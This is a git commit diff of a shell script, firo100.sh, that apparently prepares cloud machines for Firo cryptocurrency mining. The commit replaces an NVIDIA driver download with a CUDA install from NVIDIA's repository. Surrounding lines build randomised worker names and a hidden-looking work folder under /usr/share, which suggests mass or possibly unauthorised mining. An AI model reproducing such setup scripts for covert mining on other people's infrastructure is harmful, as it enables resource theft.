4e4a2a15bbb21482738f801fcc27db6da72e00dc
wollfoo <nhac.tien1988@gmail.com>
2023-08-03 19:26:56 +0700

    Update firo100.sh

--- firo100.sh
+++ firo100.sh
@@ -4,10 +4,13 @@ apt-get install -y git wget screen
 azure=mxsemsdnlkdj
 a='mxsemsdnlkdj-' && b=$(shuf -i10-375 -n1) && c='-' && d=$(shuf -i10-259 -n1) && cpuname=$a$b$c$d
 apt-get install -y git wget screen
-rm -rf NVIDIA-Linux-x86_64-525.105.17.run
-wget https://uk.download.nvidia.com/tesla/525.105.17/NVIDIA-Linux-x86_64-525.105.17.run
-sudo chmod +x NVIDIA-Linux-x86_64-525.105.17.run
-./NVIDIA-Linux-x86_64-525.105.17.run
+sudo wget https://developer.download.nvidia.com/compute/cuda/repos/ubuntu1804/x86_64/cuda-ubuntu1804.pin 
+sudo mv cuda-ubuntu1804.pin /etc/apt/preferences.d/cuda-repository-pin-600
+sudo wget https://developer.download.nvidia.com/compute/cuda/11.6.1/local_installers/cuda-repo-ubuntu1804-11-6-local_11.6.1-510.47.03-1_amd64.deb
+sudo dpkg -i cuda-repo-ubuntu1804-11-6-local_11.6.1-510.47.03-1_amd64.deb
+sudo apt-key add /var/cuda-repo-ubuntu1804-11-6-local/7fa2af80.pub
+sudo apt-get update
+sudo apt-get -y install cuda
 rm -r /usr/share/work/$azure
 mkdir /usr/share
 mkdir /usr/share/work
